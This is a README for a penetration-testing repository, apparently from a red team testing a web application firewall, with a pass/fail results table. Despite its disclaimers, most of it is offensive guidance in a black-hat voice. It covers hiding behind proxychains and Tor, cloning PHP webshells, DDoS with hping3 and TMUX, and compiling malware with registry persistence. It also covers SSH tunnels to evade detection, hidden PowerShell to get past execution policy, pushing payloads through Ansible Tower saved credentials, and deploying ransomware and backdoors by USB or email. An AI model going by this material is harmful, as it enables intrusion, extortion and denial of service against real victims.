
<h1>Penetration testing project backup</h1>
<br>
<img src="./images/ethical-hacking.jpg" alt="Ethical Hacking" title="Ethical Hacking" width="600" height="360" />
<br>
<br>
<h1>Disclaimer</h1>
<br>
<h1>This repository does NOT encourage any forms of Malicious Activities OR Unethical Hacking against any person(s)/Group(s)/Insitution(s) or Government(s)</h1>
<br>
<h1>This repository is a medium of collaboratively public Learning, Research & Development on how to protect ourselves from modern Cyber Warfare.</h1>
<br>
<h2>Most importantly, we still do NOT have any practical approaches against fileless hacking discussed & explained herewith.</h2>
<br>
<h3>Python Scapy for Rapid prototyping</h3>
<br>
<h3>Some Violent Python</h3>
<h2>(Entry level): OOP, Python, Bash, HTTP, Socket, TCP/IP
</h2>
<br>
<h1>FREE knowledge</h1>
<h3>https://repo.zenk-security.com/Programmation/Violent%20Python%20-%20A%20Cookbook%20for%20Hackers,%20Forensic%20Analysts,%20Penetration%20Testers%20and%20Security%20Enginners.pdf
</h3>
<h1>The Purposes of this repo</h1>
<br>
<h2>Contributors of 1st PoC:<h2>
<img src="./images/IGS.png" alt="IGS" title="IGS" width="1000" height="600" />
<h2>IGS Cybersecurity ( & Network) team, IGS Fullstack Dev team, IGS SRE team, IGS DevSecOps team, IGS Infra team, IGS Network team, IGS Cybersecurity Blue Team, IGS Cybersecurity Red Team, Anonymous Developers behind the scenes</h2>
<br>
<h4>I have formal permissions and associated priviledges to launch these attacks on the Web Application Firewall products provided by other IT vendor company during a Proof of Concepts process</h4>
<br>
<h1>A Web Application Firewall looks like:</h1>
<img src="./images/waf.png" alt="Web App Firewall" title="Web App Firewall" width="1460" height="660" />
<br>
<h2>This repo is documented for learning & professional development purposes</h2>
<br>
<h1>If you do NOT follow rules below, YOU absolutely GO TO JAIL ;)</h1>
<img src="./images/Jail.jpg" alt="Jail" title="Jail" width="1460" height="660" />
<br>
<h1>Rule 0:</h1>
<h2>Set up your own lab as your hacking ground, do NOT perform any hacking on the Internet</h2>
<br>
<h1>Rule 1:</h1>
<h2>Ask your victims for permissions before doing any of these</h2>
<br>
<h1>Rule 2:</h1>
<h2>Do NOT launch any of these without permissions</h2>
<br>
<h1>Rule 3:</h1>
<h2>Please ONLY run these scripts on your victims, NOT your good selves...</h2>
<br>
<h1>Part 0 - Protections</h1>
<h2>If you're really challenging some Authoritativeness using your hacking skills, well good luck out there ;)</h2> 
<br>
<h2>Self-protections techniques might save your life ;)</h2>
<br>
<img src="./images/v-get-shot.gif" alt="V getting shot at" title="V getting shot at" width="400" height="400" />
<br>
<h1>Proxychains</h1>
<h2>This will change your Public IP using a number of proxy servers</h2>
<img src="./images/proxychains.jpg" alt="proxychains" title="proxychains" width="1280" height="720" />
<img src="./images/proxychains-output.png" alt="proxychains-outputs" title="proxychains-outputs" width="1117" height="605" />
<br>
<h2>Tutorial</h2>
<h3>https://www.youtube.com/watch?v=KWwOU1z5E8E&t=657s</h3>
<br>
<h1>TOR</h1>
<img src="./images/tor.jpg" alt="TOR" title="TOR" width="660" height="330" />
<br>
<h2>Tutorial</h2>
<h2>https://www.youtube.com/watch?v=6vg5JlQhHgo</h2>
<br>
<h1>Part 1 - Our Full-fleged Attacks platform(s)</h1>
<h1>Leveraging DevSecOps team's Might for Fire-superiority :D</h1>
<img src="./images/air-fortress.gif" alt="air-fortress" title="air-fortress" width="512" height="217" />
<h1>Let's rock :D</h1>
<br>
<h1>i. Ansible Tower</h1>
<img src="./images/ansible-tower.jpg" alt="Ansible Tower" width="400" height="300" />
<br>
<h1>Part 2 - Introducing the components of our powerful Cybersecurity tools</h1>
<br>
<h1>1. Kali Linux</h1> 
<h2>https://www.kali.org/</h2>
<img src="./images/kali-linux.gif" alt="Kali Linux" title="Kali Linux" width="650" height="450" />
<br>
<h2>Purpose of Kali Linux:</h2>
<h2>Offensive Security Open-source software</h2>
<h2>Recon, Man-in-the-middle, Cracking, SSL Stripping, Network Sniffing</h2>
<br>
<br>
<h2>Upon fresh installation of an ISO image on VMware</h2>
<h2>You need to update && upgrade Kali repository</h2>
<br>
<h2>Step 1 Update expired Kali keys on base-build image</h2>
<h2>sudo wget https://archive.kali.org/archive-key.asc -O /etc/apt/trusted.gpg.d/kali-archive-keyring.asc;</h2>
<br>
<h2>Step 2 Update Kali.org Repository to start using HTTPS</h2>
<h2>sudo vim /etc/apt/sources.list;</h2>
<h2>Add these lines:</h2>
<h2>deb https://http.kali.org/kali kali-rolling main non-free contrib</h2>
<h2>deb-src https://http.kali.org/kali kali-rolling main non-free contrib</h2>
<h2>:wq<h2>
<h2>APT update & upgrade</h2>
<h2>sudo apt update && apt -y upgrade;</h2>
<br>
<h2>Step 4 Clean up APT after updating & upgrading to Kali repo</h2>
<h2>sudo apt autoremove -y;</h2>
<br>
<h2>To automate Kali repository & Install Attack tools</h2>
<h2>https://github.com/berlinlee-phoenix/Kali-Rebuild-Auto</h2>
<br>
<h1>If you have a Networking background</h1>
<h2>Download => Virtual Machines</h2>
<h2>Select your Virtualization environment</h2>
<h2>VMware / VirtualBox / Hyper-V</h2>
<br>
<h2>Get ISO images </h2>
<h2>https://www.kali.org/get-kali/#kali-installer-images</h2>
<br>
<h2>Being a Netrunner is like</h2>
<img src="./images/v-spin-knives.gif" alt="V for Vendetta" title="V" width="720" height="302" />
<img src="./images/v-my-turn.gif" alt="my-turn" title="my-turn" width="720" height="405" />
<br>
<h1>If you have a Programming background</h1>
<br>
<h2>Get Containers (Docker/LXC/LXD) </h2>
<img src="./images/containers.jpg" alt="Containers" title="Containers" width="500" height="270" />
<br>
<h2>https://www.kali.org/get-kali/#kali-containers</h2>
<h2>apt update && apt -y install kali-linux-headless</h2>
<h2>apt update && apt -y install kali-linux-large</h2>
<h2>docker pull kalilinux/kali-rolling</h2>
<h2>Being a Developer is like:</h2>
<img src="./images/v-sugar.gif" alt="V x Shakespeare" title="V x Shakespeare" width="720" height="580" />
<h2>How many people actually comprehend what a Developer says? I doubt...</h2>
<br>
<img src="./images/dumbledore.gif" alt="Dumbledor" title="Dumbledor" width="500" height="210" />
<br>
<h1>If you have both Networking & Programming background...</h1>
<h2>OMG! You ARE GONNA go on a RAMPAGE!! :D</h2>
<img src="./images/luke-hallway-0.gif" alt="Luke gor" width="720" height="470" />
<img src="./images/luke-hallway-1.gif" alt="Luke gor" width="720" height="400" />
<img src="./images/luke-hallway-2.gif" alt="Luke gor" width="720" height="400" />
<br/>
<h1>3. wireShark</h1>
<img src="./images/wireShark.gif" alt="wireShark" width="720" height="540" />
<img src="./images/wireShark.png" alt="wireShark2" width="720" height="462" />
<img src="./images/wireShark2.jpg" alt="wireShark3" width="720" height="400" />
<h2>Purposes of wireShark:</h2>
<h2>To capture all network traffic once you launch any attacks</h2>
<br>
<h2>wireShark = Capstone to allow us further engineer our Fire-superiority & exceed our Cyber Arms' limitations everyday :D</h2>
<br>
<h2>We can capture network traffic as .pcapng files & use USArmy Dshell to decode the captured traffic using a variety of dshell decoders :D</h2>
<h2>US Army Dshell project:</h2>
<h2>https://github.com/USArmyResearchLab/Dshell</h2>
<br>
<h2>See ./Dshell/Dshell guide.docx for user guide :D</h2>
<br>
<h2>Everyone can be Alan Turing :D</h2>
<h2>Alan Turin</h2>
<img src="./images/Alan-Turing.jpg" alt="Alan Turing" width="800" height="450" />
<h2>https://www.youtube.com/watch?v=owSoB4s9el8</h2>
<br>
<h1>If wireShark is used maliciously</h1>
<h2>wireShark comes in extremely handy upon our Man-in-the-middle attacks (Bettercap/Ettercap) :D</h2>
<h2>The tutorial for man-in-the-middle<h2>
<h2>https://www.youtube.com/watch?v=CW0Mf9qGBOc&t=154s</h2>
<br>
<h2>All of our ARP spoofed/poisoned Victims' network connections are totally exposed to us as Black Hats :D</h2>
<h2>We know what every victim is doing, browsing, their insecure logins (without TLSv1.2) for websites + SMTP servers + SQL by following their TCP/HTTP Streams :D</h2>
<h2>wireShark is just one of the best Cyber Arms ever :D</h2>
<br>
<h1>Using wireShark for good</h1>
<h2>Good guys also use Ettercap to do man-in-the-middle for spoofing suspicious targets to allow tracing of bad guys ;)</h2>
<h2>Arp poisoned suspicious targets => wireShark => choose a NIC => filter: ip.addr == pok guys' IP => follow TCP streams</h2>
<h2>i. Tracing Backdoor Server + Backdoor Client connections</h2>
<h2>ii. Arp spoofing attacks indicated by duplicated MAC address for the same IP in use</h2>
<h2>iii. Broadcast Address attacks (Arp + DHCP spoofing) detections</h2>
<h2>iv. ICMPv4 Flood detection</h2>
<h2>v. TCP SYN ACK Flood detection</h2>
<br>
<h1>3. Bash scripts</h1>
<img src="./images/bash.jpg" alt="Bash" title="Bash" width="720" height="405" />
<h2>Purpose of Bash: Automation, configuration management, Multiplexing </h2>
<h2>Purpose of Bash: Ansible Artifactory bypass, Automated SSH Tunnelling through remote port forwarding to bypass firewall & Opening closed ports on victims machines ;)</h2>
<br>
<h2>For instance, we wanna do some Brute-forcing</h2>


![SSH Tunneling](https://toic.org/media/filer_public/2c/ce/2ccea4dc-0a3b-4d0e-b36e-8484ad6e6262/reverese-ssh4.png)
##
# 5. Python
![Python](https://img-c.udemycdn.com/course/750x422/2722434_fd59_6.jpg)
![Malware](https://miro.medium.com/v2/resize:fit:1024/1*4JNE_7d_4fhj9ef9N07OEg.png)
##
## Bullseye for pentesting modern Linux based systems especially those web servers allowing users to upload files without regexp validations ;)
##
## Since 202x, Python3.4 to Python3.9 are inbuilt runtime for many Linux based OS e.g. CentOS stream9, Debian 12, RedHat Linux etc.
##
## Leveraging all built-in runtime e.g. PowerShell + Python + Bash gives you essentially extra 3 attack surfaces as combined-arm edges :D
## 
## Purpose of general Python: Rapid Prototyping for Security PoC, Automation scripting, Socket programming
##
## Usage
## Install Python Dependencies
## bash ./Malware-Dev/install-modules.sh
##
# 6. Python Forensics - The Scapy module
## Purpose of Scapy: Network sniffing, Network Automation, Network analysis
![Python Scapy](https://scapy.readthedocs.io/en/latest/_images/animation-scapy-asyncsniffer.svg)
##
## As Python3.4 to Python3.9 runtime are very common on modern Linux OS
## Installing python3-pip is NOT suspicious at all :D
##
## Installation of Python3 Scapy
## Windows:
## python -m pip install scapy --user IGS
##
## Linux:
## sudo pip install scapy;
##
## Tutorials 
## https://www.youtube.com/watch?v=YKxKnVE5FaE&list=PLhfrWIlLOoKOc3z424rgsej5P5AP8yNKR
##
# 7. Python multi-processing module
## Purpose of multiprocessing: Slightly enhance Python slow performance...Not so useful...
![Python Multi-processing](https://i.ytimg.com/vi/CRJOQtaRT_8/sddefault.jpg)
![Python Multi-processing](https://miro.medium.com/v2/resize:fit:1400/1*3UHj7DLOsHLIdt2YiOoZ3w.gif)
## This serves as another Multiplexer to run your malicious scripts in parallel processes (asynchronous processes) to overcome Python very slow performance...
##
## Multi-processing != Multi-threaded
#
# 8. Python multi-processing
## https://www.youtube.com/watch?v=fKl2JW_qrso&list=PLdbtMgV1x_BiBTh_JwYpzramnhzOLgXvx&pp=gAQBiAQB
##
## If you're looking forward to further enhance the DDoS firepower => 
# Try Golang :D
![Golang](https://www.freecodecamp.org/news/content/images/2021/10/golang.png)
# gopacket module :D 
![Black Hat Go](https://m.media-amazon.com/images/I/81k+Ajmu4fL._AC_UF1000,1000_QL80_.jpg)
## https://github.com/google/gopacket
## 
## If you're really a crazy Red Team developer like me with a thirst of absolute fire-superiority to DDoS your targets :O
![Oh No](https://tukuimg.bdstatic.com/scrop/b6e769b92640ac9d813f5c86e6156e32.gif)
![Avada Vedavra](https://i.gifer.com/A4yu.gif)
![Explosion](https://i.pinimg.com/originals/b2/47/df/b247dfc239ea15e382dfee809ffac3ea.gif)
![My Railgun](https://31.media.tumblr.com/95805eb5b84a264b6a2cef62fc54d42c/tumblr_mqta92HN4n1r5db25o1_500.gif)
## Try Rust - the Crab for concurrent programming :D
![Rust](https://mir-s3-cdn-cf.behance.net/project_modules/disp/fe36cc42774743.57ee5f329fae6.gif)
## We have a real prototypal Rust program in ./Port-scanner/Rust/
## https://www.youtube.com/watch?v=LDU_Txk06tM
<img src="./images/crab-dancing.gif" title="crab island" width="500" height="275" />

## To edit Rust code ./Port-scanner/Rust/src/main.rs
## Re-compiling after editing code:
## rustc ./Port-scanner/Rust/src/main.rs;
##
## To run the Rust Port-scanner program
## cargo run -- -j thread IP_ADDR;
## I normally use -j 10000 threads for Port scanning ;)
##
# 9. Using Kali built-in powerful Attack Tools made of C, Perl, Ruby, Golang, and Python programming langauges :D
<img src="./images/kali-tools.gif" alt="kali-tools" width="600" height="420" />

![Kali Tools](https://www.kali.org/images/notebook-kali-2022.1.jpg)
##
## Writing some very simple Bash + Kali Tools give you extra edges :D
## Brute-forcing with Hydra
![Hydra](https://miro.medium.com/v2/resize:fit:1358/0*Kx7N8nKgqqdXhYgX.jpg)
## Hands-on example
## cd ./Brute-force
## Edit hydra.sh OR 1n3sniper.sh
## Edit the namelists & wordlists used for hydra
## Edit the namelists & wordlists used for 1N3/Sn1per
##
# 
# 10. Tmux 
## Purpose of TMUX: Terminal Multiplexing
## A Multiplexer allows you to run your Bash scripts using 100+ terminals at the same time, when performing DoS using a single Kali VM/Kali Docker :D
![TMUX](https://raw.githubusercontent.com/tedsluis/tmux.conf/master/tmux_screenshot.gif)
##
## Multiplexer = A Mux serves as a layer of Amplifier to condense your fire-power
## TMUX = A Mux to multiplex your single Brute-forcing script into 100+ terminals of concurrent bash sessions to run the single Bash script :D
![Multiplexer](https://www.electrical4u.com/wp-content/uploads/What-is-a-Multiplexer.png)
##
# 11. Open-source Namelists & Wordlists for Brute-forcing
## Download custom Namelists & Wordlists from github.com
## https://gist.github.com/DaveYesland/e1d42489334049daf59d1c26543faa8b
##
## Performing DDoS using Bash + Docker Kali
### bash fire-superiorty-hydra.sh
### once at a given time to avoid crashing your Kali Linux
### Aim well & make it count ;)
##
# 12. Open-source PHP-Backdoors from Github
## Let's thank to the backdoors contributors ;)
# i. https://github.com/1337r0j4n/php-backdoors
## Usage =>
## git clone https://github.com/1337r0j4n/php-backdoors.git
##
## ii. https://github.com/tennc/webshell/tree/master
## Usage =>
## git clone https://github.com/tennc/webshell.git
##
## iii. https://github.com/bartblaze/PHP-backdoors
## Usage =>
## git clone https://github.com/bartblaze/PHP-backdoors.git
## 
## https://github.com/topics/php-webshell-backdoor
##

![Python Scapy](https://scapy.readthedocs.io/en/latest/_images/animation-scapy-asyncsniffer.svg)
# i. Network sniffing
## python3 ./Port-scanner/Python/port-scanner.py
## cd ./Port-scanner/Rust/ && sudo cargo run -- -j 10000 IP_ADDR
##
# ii. Network Point-to-point connections sniffer
## python3 ./P2P/find-p2p.py;
## Enter Network_Addr/CIDR
##
# iii. Arp-spoofing illustrated
![ARP spoofing](https://www.okta.com/sites/default/files/media/image/2021-04/ARPPoisoningSpoofing.png)
##
## python3 ./Arp-spoofer/arp-spoofer.py;
##
## Tutorial
## https://www.youtube.com/watch?v=CW0Mf9qGBOc&t=117s
##
# iv. Spanning Tree Protocol attack illustrated
![SPT attack](https://cdn.networklessons.com/wp-content/uploads/2014/10/spanning-tree-mitm.png)
##
## python3 ./STP-attack/stpHackRootPort.py;
##
## Theory
## https://www.youtube.com/watch?v=japdEY1UKe4
## Journals
## https://notes.networklessons.com/stp-root-bridge-selection
##
# v. TCP Syn-Ack flooding illustrated
![Sync Flood](https://purplesec.us/wp-content/uploads/2019/07/SNY-attack-cyber-attack.png)
##
## python3 ./Sync-flooder/flooder.py;
## 
# Hping3 + TMUX
## Edit your target_IP & spoof_IP first in ./Sync-flooder/hping3-buster.sh 
## bash ./Sync-flooder/fire-superiority-hping3.sh;
##
## Theory explained
## https://www.youtube.com/watch?v=tClcCMrXzek&t=385s
##
# Part 4 - Compiling Python scripts .py => .exe
## Best Practices for compiling malware to .exe:
![Python compilers](https://cdn.educba.com/academy/wp-content/uploads/2019/06/python-compilers.jpg)
##
## Approach:
## Use Python compiler pyinstaller
![pyinstaller](https://i.ytimg.com/vi/bubZ5Cxaybg/maxresdefault.jpg)
## python -m pyinstaller single.py --onefile --noconsole;
##
## FREE tutorial
## https://www.youtube.com/watch?v=bqNvkAfTvIc&list=PLdbtMgV1x_BgL1Zns9Nx3f8qG_IRU8G4A&index=25&pp=gAQBiAQB
## 
## Reside the only .exe to your targets
## Gain persistency using Windows Registry keys in your python code

<img src="./images/malware-registry-path.png" alt="regedit" width="910" height="280" />
<img src="./images/malware-registry-path-2.png" alt="regedit" width="920" height="860" />

##
## SSH Tunneling Hands-on Tutorial 1
## Hands-on
## Read illustrated guide from:
## ./Bypass-Firewall-SSH-Tunneling/Bypassing IGS Fortinet Firewall port 443.docx
##
## Once you established a secret SSH tunnel
## Feel free to launch the Backdoor client on your victims
## Traffic derived from Downloading/Uploading files from/to Victims are securely encrypted as a Deep Web
## Intrusion Detection Systems won't be able to trace encrypted SSH tunnelled traffic ;)
## This gives you an extra edge in maintaining persistency on your Victims (Botnets) ;)
##
## Pre-requisites:
## An AWS EC2 Linux with Public port forwarding & GatewayPorts open
## 
## https://www.youtube.com/watch?v=Wp7boqm3Xts&t=870s
##
## SSH Tunneling Tutorial 2
## https://www.youtube.com/watch?v=pk5OF8XZSFM

# Part 6 - The Phantom Fileless attacks on any platforms
![Phantom attacks](https://i.ytimg.com/vi/xZtPFCHip0Y/maxresdefault.jpg)
## Encapsulated maliacious payloads on Windows/ Linux: 
## Traditionally, you'll need to change Execution Policy in Powershell on a Windows computer
![Bypass PS Exec Policy](https://www.top-password.com/blog/wp-content/uploads/2018/09/Set-ExecutionPolicy.png)
## Yet, we can somehow bypass this Execution Policy settings using just cmd.exe to run:
## PowerShell.exe -windowStyle hidden -command "line1; line2; line3; line4;"
## This bypasses PowerShell Execution-Policy & PS-Remoting settings :D

## As most of us are using Win10/11 in 2024 :D
## PowerShell becomes the default runtime on our Windows :D
## This technique is extremely useful to wear your black hat in a strict Enterprise environment ;)
## NOT many in-house Cybersecurity professionals have to know-how to catch you ;)
![Catch me if you can ;)](https://cdn.theasc.com/Catch-Me-If-You-Can-Featured.jpg)
![Leonardo](https://i.pinimg.com/564x/a8/7b/87/a87b8795a17bf841cba6e7dca959a4c5.jpg)

# Hands-on example
## Please try:
## open cmd.exe
## powershell.exe -windowStyle hidden -command "$telnet = test-netConnection -computerName 127.0.0.1 -port 8080; $telnet | Out-File -FilePath .\telnet.txt -Encoding utf8;"

## To verify whether telnet.txt comes up
## ls | findstr telnet
## You see? This Fileless technique can even run Telnet without enabling Telnet on your Windows ;)
##
## Linux:
## Bash terminal:
## printf "import time, rotatescreen as rs\npd = rs.get_primary_display()\nangle_list = [0, 90, 180, 270, 90, 180, 90, 270]\nwhile True:\n\tfor i in range(5):\n\t\tfor x in angle_list:\n\t\t\tpd.rotate_to(x)\n\t\t\ttime.sleep(0.5)" > virus.py &&
## python ./virus.py &&
## rm -rf ./virus.py
##
# Part 7 - DevOps tools exploitations
## Remember that, DevOps are always LAZY :D
## DevOps operating in an Enterprise environment are essentially working with large numbers of networks, environments and OS
##
## DevOps do NOT have the brain-throughput to remember every single god damned long+multi-factored password
## DevOps store frequently used passwords as Credential instances
![Ansible Tower saved credentials](https://netapp.io/wp-content/uploads/2019/01/Screen-Shot-2019-01-25-at-11.33.30-AM-1024x618.png)
## within an Ansible Tower, or use notepad to store all the passwords, then rush through every automation task running on Ansible Towers
## Exploit DevOps' laziness will necessarily give you an extra edge as a Black Hat
##
## Grab an Ansible Tower => Enumerate a user with careless saved password for Privilege Escalation => using "ARGUMENTS" entry to bypass artifactory code screening without using a god-damned .yml playbook
![Hacking w/ Ansible](https://docs.ansible.com/ansible-tower/latest/html/userguide/_images/ad-hoc-commands-inventory-run-command.png)
## Send Fileless malicious payloads using Ansible Tower
## Modules => Select win_command
## ARGUMENTS:
## powershell.exe -windowStyle hidden -command "line1; line2; line3; line4;"
## Hands-on example
## Please try:
## modules: select win_cmd
## in ARGUMENTS:
## powershell.exe -windowStyle hidden -command "$telnet = test-netConnection -computerName 127.0.0.1 -port 8080; $telnet | Out-File -FilePath C:\temp\telnet.txt -Encoding utf8;"
##
## Verify by Ansible "ARGUMENTS" tab:
## powershell.exe -windowStyle hidden -command "ls C:\temp | findstr telnet; Get-Content C:\temp\telnet.txt;"
##
## Linux:
## Bash terminal:
## printf "import time, rotatescreen as rs\npd = rs.get_primary_display()\nangle_list = [0, 90, 180, 270, 90, 180, 90, 270]\nwhile True:\n\tfor i in range(5):\n\t\tfor x in angle_list:\n\t\t\tpd.rotate_to(x)\n\t\t\ttime.sleep(0.5)" > virus.py &&
## python ./virus.py &&
## rm -rf ./virus.py
## Thus, no one can easily trace what the heck you did to them
## If you persist doing these crazy shit without formal permissions
## I hope you do NOT get caught & go to jail...
## Do NOT blame this repository owner
## This repository owner NEVER suggests hacktivism
## This repository owner suggests continuous learning & defending by mimicking why & how malicious hackers portray their skills
##

# Part 8 - Malware Development
## 1. Backdoor PoC
![Backdoor](https://blogs.juniper.net/wp-content/uploads/2022/12/SEC-220694_DIGITAL_Threat-Labs-ESXi-backdoor-anchor_2000x1116-1024x571.png)
##
## FREE Tutorials
# 1. Python networking
## https://www.youtube.com/watch?v=3UOyky9sEQY&list=PLdbtMgV1x_BiFtjWTuylQbz8cF77F5bQA&pp=gAQBiAQB
##
# 2. Python Socket
## https://www.youtube.com/watch?v=xA7qrXwXUlg&list=PLdbtMgV1x_BinAQ6F7FEaVEE0B7TP1NGS&pp=gAQBiAQB
## 
## https://www.youtube.com/watch?v=3QiPPX-KeSc&list=PLdbtMgV1x_BgL1Zns9Nx3f8qG_IRU8G4A&index=26&t=16s&pp=gAQBiAQB
##
## Victims' machines:
## You will need to get your victims to connect to your network
## e.g. Wireguard VPN 
![Wireguard](https://www.zenarmor.com/docs/assets/images/1-f429b46a671cf6531fc5c99dd6fe302c.png)
## You victims will be able to connect to your network as Backdoor client only
#
## *** Usage ***
## *** Read the guide in ./Backdoor-verB/Backdoor coding.docx***
##
## Deployment?
## Use your creativity to find the way to make victims run vpn -> run code in reverse_shell.py
## A USB?
## An e-mail?
## Ansible Tower?
## Wireguard VPN?
## Use your creativity ;)
## Backdoor Server:
## Use your creativity to host server.py in somewhere safe ;)
## May be some hackers' playground like OVH Cloud, with Indian Cloud servers hosted in India Data Centers? :D
![OVH Cloud](https://us.ovhcloud.com/sites/default/files/styles/large_screens_1x/public/2023-02/why-ovhcloud-icon-infographic-2018.png)

# 2. Ransomware PoC:
![Ransomware](https://thepythoncode.com/media/articles/make-a-ransomware-in-python.jpg)
##
## FREE Tutorial
## https://www.youtube.com/watch?v=bEA8HI_I5bQ&list=PLdbtMgV1x_BgL1Zns9Nx3f8qG_IRU8G4A&index=24&pp=gAQBiAQB
##
# Ransomware & Backdoor can only be used when victims connect to your server network locally using VPN
##
## These attacks do NOT operate in WAN
## Start using
## cd ./Malware-Dev &&
## Edit the listening server IP_ADDRESS in server.py in line 11 
## Edit the listening port to your attacker machine IP & desired port no.
##
## Run the server.py to start listening
## python ./Ransomware/server.py;
## On your victim's machine 
## Edit the IP_ADDRESS in line 109 to attacker's machine IP
## Edit the listening port no. same as in server.py
## Run encryption.exe or code from encryption.py by whatever malicious means you can imagine ;)
##
##
## Go back to your attacker's machine
## Check out encrypted_hosts.txt for decryption key
## On victim's machine, run decryption.py code by whatever means
## Enter the decryption key in 'encrypted_hosts.txt' to decrypt the locked files
## You may change the path for encryption where the encryption script runs at
##
# Enjoy :D
#
# =================== Post PoC Updates ====================
<h1>Official date of formation of PoC group: 14 Dec 2023</h1>
<br>
<img src="https://m.media-amazon.com/images/M/MV5BMjAxNTE4NTcxNl5BMl5BanBnXkFtZTcwNTk0MTYyNw@@._V1_.jpg" alt="V for vendetta knives" title="V for vendetta knives" width="650" height="400" />
<br>
<h1>1st PoC Period of Red teaming: 16 Jan 2024 to 24 Feb 2024</h1>
<br>
<h1>PoC status: Completed</h1>
<br>
<h1>Reporting...</h1>
<h2>Pass = Could defend</h2>
<br>
<h2>Failed = Failed to defend</h2>
<br>
<h2>Web Scraping (Java): pass</h2>
<br>
<h2>Generic XSS result: pass</h2>
<br>
<h2>Man-in-the-middle defense: pass</h2>
<br>
<h2>SQL Injection: pass</h2>
<br>
<h2>PHP Backdoor upload: pass</h2>
<br>
<h2>Nmap recon: failed</h2>
<br>
<h2>Hydra Web Brute-forcing: pass</h2>
<br>
<h2>Layer 7 DDoS (HTTP Flood): failed</h2>
<br>
<h2>Layer 4 DDoS (SYN ACK Flood): failed</h2>
<br>
<h2>Layer 3 DDoS (ICMPv4 Flood): failed</h2>
<br>
<h2>Layer 2 DDoS (ARP spoof Flood): failed</h2>
<br>
<h1>Official record of Maximum Terminal Sessions available for DDoS: 1000 concurrent sessions of terminals</h1>
<br>
<h1>Official record of Maximum Concurrency for JMeter: 500k concurrency</h1>
<br>
<h1>Officially tested best SystemInfo for a single unit of DDoS Kali Docker container/Kali VM: 8 CPU & 4GB RAM</h1>
<br>
<h1>Where are we heading to?</h1>

# Practical experiments indicate that DDoS attacks are the most effective & practical way to take down targets against Enterprises in Cyber Warfare
# 
# While Sneaky MSF venoms & Fileless hacking using By-pass are the most effective Social Engineering attacks against personnel
#
# Direction
## No one knows, this PoC was initiated in a completely unknown state...but completed successfully ;)
##
## We might be developing Wireguard VPN + hosting a PoC only Backdoor Server somewhere safe to simulate Ransomware + Backdoor attacks & record the entire process?
##
## We might be re-inventing the wheel & doing some CI for existing artifacts?
##
## We might be switching to Golang/Rustlang/C ?
##
## No one knows where the future holds ;)
#
## Hacking ground:
## Previously: On-prem Bare Metal
## Future: Unknown Cloud?🤔
##
## Network programming:
## Rapid Prototyping: Python Scapy
## Future Implementation: Unknown programming language(s) Golang?🤔
##
## Virtualization:
## Previously: Kali VM + Docker-compose in ESXi
## Future: Docker-compose + Terraform + Ansible?🤔
##
## Target DDoS sessions: Unknown
## Target DDoS concurrency: Unknown
## Our future where being: Unknown

<img src="./images/glory-to-ukraine.jpg" alt="Glory to Ukraine" width="530" height="400" />
<br>
<img src="https://i.pinimg.com/originals/73/a4/54/73a4541315915eb0c4f714492bad9b30.gif" alt="V for vendetta spinning knives" title="V for vendetta spinning knives" width="800" height="400" />
<br>
<img src="https://68.media.tumblr.com/d09ac3d335147e2a90fedc8ebec58960/tumblr_on9r89hEFG1v296kfo9_250.gif" alt="我妻由乃" title="我妻由乃" width="400" height="250" />
<h1></h1>
<img src="https://i.pinimg.com/originals/b2/47/df/b247dfc239ea15e382dfee809ffac3ea.gif" alt="Explosion" title="Explosion" width="800" height="500" />
<br>
<img src="https://i.makeagif.com/media/2-04-2017/eJ0A_3.gif" alt="攞你命3000" title="攞你命3000" width="800" height="500" />
